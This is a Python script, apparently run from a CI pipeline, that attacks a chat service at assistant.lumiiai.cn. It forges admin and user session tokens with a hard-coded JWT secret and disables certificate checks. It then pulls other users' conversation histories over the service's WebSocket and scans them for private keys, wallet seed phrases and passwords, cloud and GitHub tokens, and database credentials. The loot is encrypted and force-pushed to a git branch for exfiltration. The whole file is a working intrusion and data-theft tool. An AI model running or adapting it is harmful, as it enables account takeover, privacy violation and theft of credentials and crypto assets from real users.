#!/usr/bin/env python3
# probe4 (intent 28200): conversation history is NOT a REST endpoint; it is delivered over
# wss://assistant.lumiiai.cn/api/ws/chat via {type:"attach",session_id:<convId>} -> init.messages
# This probe validates that, then dumps messages for Brian(301)+admin convs and greps secrets.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, subprocess, ssl, shutil, threading, traceback, re, struct
import concurrent.futures as cf
import urllib.request, urllib.error

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
BUDGET = int(os.environ.get("PBUDGET", "2400"))

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
SUB_BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
TEST_CONV = "conv_9TXsf9UGxxP4nvaj4729R"

BASE = os.path.dirname(os.path.abspath(__file__)) if "__file__" in dir() else os.getcwd()
OUT = "/tmp/results4"
for d in ("ws", "convs", "hits"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 2592000,
                         "sid": "sid_" + str(uuid.uuid4()), "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)
_ck = {}
def cookie(sub):
    if sub not in _ck: _ck[sub] = "lumii_session=" + jwt(sub)
    return _ck[sub]

CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE

# ---------------- secret patterns ----------------
PATTERNS = [
 ("evm_privkey", r'\b0x[0-9a-fA-F]{64}\b'),
 ("pem_privkey", r'-----BEGIN (?:RSA |EC |OPENSSH |ENCRYPTED |DSA |PGP |PRIVATE )?PRIVATE KEY-----'),
 ("keystore", r'(?i)("crypto"\s*:|cipherparams|"kdf"\s*:\s*"scrypt"|"scrypt")'),
 ("mnemonic", r'(?i)(mnemonic|seed[_ ]?phrase|secret[_ ]?phrase|助记词)\s*[:=]'),
 ("deployer_key", r'(?i)(DEPLOYER_PRIVATE_KEY|PRIVATE_KEY\s*[:=]\s*[\'"]?0x[0-9a-fA-F]{40,}|X402[A-Z_]*PRIVATE)'),
 ("auth_zoofi", r'(?i)Auth for zoofi'),
 ("pg_dsn", r'(?i)(postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s"\'<>]{6,}'),
 ("aws_ak", r'\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{13,})\b'),
 ("gcp_sa", r'"type"\s*:\s*"service_account"'),
 ("jwt_hmac", r'(?i)(JWT_SECRET|SESSION_SECRET|COOKIE_SECRET|LUMII_DESKTOP_TOKEN_SECRET|HMAC_SECRET)\s*[:=]\s*[\'"]?[0-9a-zA-Z_\-]{16,}'),
 ("gh_token", r'\b(gh[pous]_[0-9A-Za-z]{30,}|github_pat_[0-9A-Za-z_]{20,})\b'),
 ("known_eoa", r'0x(?:[cC]56f[0-9a-fA-F]{36}|[fF][eE]18[0-9a-fA-F]{36})'),
 ("zoofi_index", r'(?i)(zoofi[-_]?index|trycloudflare\.com|cloudflared|\.zoofi\.io|api\.zoofi\.io)'),
 ("cf_token", r'(?i)(CF_API_TOKEN|CLOUDFLARE_API_TOKEN|CLOUDFLARE_TOKEN)\s*[:=]'),
 ("metamask", r'(?i)(MetaMask|mmv_0|PBKDF2|"salt"\s*:)'),
 ("wallet_pw", r'(?i)(MetaMask.{0,25}(password|密码)|wallet.{0,12}(password|密码)|支付密码|钱包密码)'),
 ("internal_hostport", r'\b(?:10|127|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}(?::\d{2,5})\b'),
 ("tencent_secret", r'(?i)(secretId|secretKey|SecretId|SecretKey)\s*[:=]\s*[\'"]?[A-Za-z0-9]{10,}'),
 ("ssh_pub", r'ssh-(?:rsa|ed25519) AAAA[A-Za-z0-9+/=]{40,}'),
]
PATS = [(n, re.compile(r)) for n, r in PATTERNS]
def scan(text):
    if not text: return []
    out = []
    for name, rx in PATS:
        ms = list(rx.finditer(text))
        if ms:
            snips = []
            for m in ms[:6]:
                a = max(0, m.start() - 80); b = min(len(text), m.end() + 80)
                snips.append(text[a:b].replace("\n", " "))
            out.append({"name": name, "count": len(ms), "snips": snips})
    return out

# ---------------- minimal WebSocket client ----------------
class WSErr(Exception): pass
def _recv_exact(sock, buf, n):
    while len(buf) < n:
        d = sock.recv(65536)
        if not d: raise WSErr("eof")
        buf += d
    return buf

def ws_connect(path, sub, timeout=20):
    sock = socket.create_connection((HOST, 443), timeout=timeout)
    sock.settimeout(timeout)
    ss = CTX.wrap_socket(sock, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = ("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
           "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nOrigin: https://%s\r\n"
           "Cookie: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n") % (path, HOST, key, HOST, cookie(sub))
    ss.sendall(req.encode())
    # read handshake response
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = ss.recv(4096)
        if not d: raise WSErr("handshake-eof")
        buf += d
    head, rest = buf.split(b"\r\n\r\n", 1)
    status = head.split(b"\r\n")[0].decode("latin1")
    if "101" not in status:
        ss.close()
        raise WSErr("handshake: " + status[:120])
    return ss, rest

def ws_send_text(ss, text):
    data = text.encode()
    l = len(data)
    hdr = bytearray([0x81])
    if l < 126: hdr.append(0x80 | l)
    elif l < 65536: hdr.append(0x80 | 126); hdr += struct.pack(">H", l)
    else: hdr.append(0x80 | 127); hdr += struct.pack(">Q", l)
    mask = os.urandom(4); hdr += mask
    ss.sendall(bytes(hdr) + bytes(data[i] ^ mask[i % 4] for i in range(l)))

def ws_read_message(ss, buf, timeout=20):
    """Read one complete (possibly fragmented) message. Returns (opcode, payload, buf)."""
    msg = b""; op0 = None
    ss.settimeout(timeout)
    while True:
        buf = _recv_exact(ss, buf, 2)
        b1, b2 = buf[0], buf[1]
        fin = (b1 >> 7) & 1; op = b1 & 0xf
        masked = (b2 >> 7) & 1; ln = b2 & 0x7f
        idx = 2
        if ln == 126:
            buf = _recv_exact(ss, buf, idx + 2); ln = struct.unpack(">H", buf[idx:idx+2])[0]; idx += 2
        elif ln == 127:
            buf = _recv_exact(ss, buf, idx + 8); ln = struct.unpack(">Q", buf[idx:idx+8])[0]; idx += 8
        mask = None
        if masked:
            buf = _recv_exact(ss, buf, idx + 4); mask = buf[idx:idx+4]; idx += 4
        buf = _recv_exact(ss, buf, idx + ln)
        payload = buf[idx:idx+ln]
        buf = buf[idx+ln:]
        if mask:
            payload = bytes(payload[i] ^ mask[i % 4] for i in range(len(payload)))
        if op == 0x8:
            raise WSErr("close-frame")
        if op == 0x9:  # ping -> pong
            continue
        if op == 0xa:
            continue
        if op0 is None and op in (0x1, 0x2):
            op0 = op
        msg += payload
        if fin:
            return (op0 if op0 is not None else op), msg, buf

def ws_fetch_conv(sub, cid, path="/api/ws/chat", timeout=25, maxmsgs=400):
    """Attach to conv and return init messages (list) + meta."""
    ss, buf = ws_connect(path, sub, timeout=timeout)
    try:
        ws_send_text(ss, json.dumps({"type": "attach", "session_id": cid}))
        got_init = None; meta = {}
        deadline = time.time() + timeout
        while time.time() < deadline:
            op, pl, buf = ws_read_message(ss, buf, timeout=max(1, deadline - time.time()))
            if op != 0x1:
                continue
            try: j = json.loads(pl)
            except Exception: continue
            t = j.get("type")
            if t == "hello":
                meta["hello"] = {k: j.get(k) for k in ("heartbeat", "viewing")}
                continue
            if t == "init":
                got_init = j
                break
            if t in ("pong",):
                continue
        if got_init is None:
            return {"ok": False, "err": "no-init", "meta": meta}
        msgs = got_init.get("messages") or []
        return {"ok": True, "messages": msgs, "n": len(msgs),
                "keys": list(got_init.keys()),
                "connected": got_init.get("connected"),
                "caps": got_init.get("capabilities", [])[:20] if isinstance(got_init.get("capabilities"), list) else got_init.get("capabilities")}
    finally:
        try: ss.close()
        except Exception: pass

# ---------------- main phases ----------------
def phase_probe():
    res = {}
    # variant A: plain path
    for name, path in (("plain", "/api/ws/chat"),
                       ("agent", "/api/ws/chat?agentId=" + TEST_CONV),
                       ("token", "/api/ws/chat?token=" + jwt(SUB_BRIAN))):
        for subname, sub in (("brian", SUB_BRIAN), ("admin", SUB_ADMIN)):
            t0 = time.time()
            try:
                r = ws_fetch_conv(sub, TEST_CONV, path=path, timeout=25)
                r["variant"] = name; r["sub"] = subname; r["path"] = path; r["elapsed"] = round(time.time()-t0, 1)
                if r.get("ok"):
                    ms = r["messages"]
                    r["sample"] = json.dumps(ms[:1], ensure_ascii=False)[:800]
                    r["roles"] = {}
                    for m in ms[:200]:
                        if isinstance(m, dict):
                            r["roles"][m.get("role", "?")] = r["roles"].get(m.get("role", "?"), 0) + 1
                log("W", name, subname, "ok" if r.get("ok") else r.get("err"), "n=", r.get("n"), "keys=", r.get("keys"), r.get("elapsed"))
                res["%s_%s" % (name, subname)] = r
                if r.get("ok") and r.get("n", 0) > 0:
                    json.dump(r, open(os.path.join(OUT, "ws", "probe_%s_%s.json" % (name, subname)), "w"), ensure_ascii=False)
            except Exception as e:
                log("W", name, subname, "EXC", repr(e))
                res["%s_%s" % (name, subname)] = {"ok": False, "err": repr(e), "variant": name, "sub": subname}
    json.dump(res, open(os.path.join(OUT, "ws", "matrix.json"), "w"), ensure_ascii=False, indent=1)
    # pick working variant
    best = None
    for k, r in res.items():
        if r.get("ok") and r.get("n", 0) > 0:
            best = r; break
    return res, best

def phase_dump(working):
    path = working.get("path", "/api/ws/chat")
    convs = json.load(open(os.path.join(BASE, "convs_index.json")))
    # Brian's convs first
    convs.sort(key=lambda c: 0 if SUB_BRIAN in (c.get("subs") or []) else 1)
    idx = []; hit = [0]; saved = [0]; lock = threading.Lock(); done = [0]
    def work(c):
        if time.time() - START > BUDGET - 120: return
        cid = c["id"]; subs = c.get("subs") or [SUB_ADMIN]
        # prefer brian sub
        order = [SUB_BRIAN] if SUB_BRIAN in subs else []
        for s in subs:
            if s not in order: order.append(s)
        for s in order[:2]:
            try:
                r = ws_fetch_conv(s, cid, path=path, timeout=30)
            except Exception as e:
                with lock: idx.append({"id": cid, "title": c.get("title"), "ok": False, "err": repr(e)[:120]})
                return
            if r.get("ok"):
                ms = r["messages"]
                txt = json.dumps(ms, ensure_ascii=False)
                hs = scan(txt)
                with lock:
                    idx.append({"id": cid, "title": c.get("title"), "ok": True, "n": len(ms),
                                "sub": ("brian" if s == SUB_BRIAN else "other"), "matches": [h["name"] for h in hs]})
                    done[0] += 1
                    if hs:
                        hit[0] += 1
                        try:
                            open(os.path.join(OUT, "hits", "%s.json" % cid), "w", encoding="utf-8", errors="replace").write(
                                json.dumps({"id": cid, "title": c.get("title"), "sub": s, "matches": hs,
                                            "messages": ms[:200]}, ensure_ascii=False))
                        except Exception: pass
                    if saved[0] < 80000000:
                        try:
                            open(os.path.join(OUT, "convs", "%s.json" % cid), "w", encoding="utf-8", errors="replace").write(txt[:2000000])
                            saved[0] += len(txt)
                        except Exception: pass
                return
            else:
                with lock: idx.append({"id": cid, "title": c.get("title"), "ok": False, "err": r.get("err"), "sub": ("brian" if s == SUB_BRIAN else "other")})
    with cf.ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(work, c) for c in convs]
        lastpush = time.time()
        for f in cf.as_completed(futs):
            if time.time() - START > BUDGET - 100: break
            if time.time() - lastpush > 90:
                json.dump(idx, open(os.path.join(OUT, "convs", "messages_index.json"), "w"), ensure_ascii=False)
                log("W dump progress done=%d hits=%d savedMB=%.1f" % (done[0], hit[0], saved[0] / 1e6))
                push_results("mid")
                lastpush = time.time()
    json.dump(idx, open(os.path.join(OUT, "convs", "messages_index.json"), "w"), ensure_ascii=False)
    log("W dump done. total=%d done=%d hit_convs=%d" % (len(convs), done[0], hit[0]))

# ---------------- push ----------------
RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-msg-28200-results")
def push_results(tag="part"):
    enc = "/tmp/results4.tar.gz.gpg"
    try:
        for p in ("/tmp/results4.tar.gz", enc, "results4.tar.gz.gpg"):
            if os.path.isfile(p): os.remove(p)
        subprocess.run("tar czf /tmp/results4.tar.gz -C /tmp results4", shell=True, check=False)
        if not (os.path.isfile("/tmp/results4.tar.gz") and os.path.getsize("/tmp/results4.tar.gz") > 0): return
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results4.tar.gz" % enc,
                           shell=True, capture_output=True, text=True, timeout=300)
        if os.path.isfile(enc) and os.path.getsize(enc) < 95 * 1024 * 1024:
            shutil.copy(enc, "results4.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f results4.tar.gz.gpg && git commit -m 'ci results4 %s %s' || true" % (RUNID, tag), shell=True, check=False)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH, shell=True, capture_output=True, text=True, timeout=600)
            log("PUSH(%s) rc=%s err=%s" % (tag, r.returncode, (r.stderr or "")[-200:]))
    except Exception as e:
        log("PUSH EXC", repr(e))

def _wd():
    while True:
        time.sleep(5)
        if time.time() - START > BUDGET:
            log("watchdog timeout; push partial")
            try: push_results("watchdog")
            except Exception: pass
            os._exit(1)
threading.Thread(target=_wd, daemon=True).start()

def main():
    log("=== probe4 start run", RUNID, "base", BASE, "===")
    res, working = phase_probe()
    push_results("after_probe")
    log("picked:", json.dumps({k: working.get(k) for k in ("variant", "sub", "path", "n")}, ensure_ascii=False) if working else None)
    if working:
        phase_dump(working)
    else:
        log("NO WORKING WS - negative boundary in ws/matrix.json")
    log("DONE")
    push_results("final")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log("FATAL", traceback.format_exc())
        try: push_results("fatal")
        except Exception: pass
    sys.exit(1)
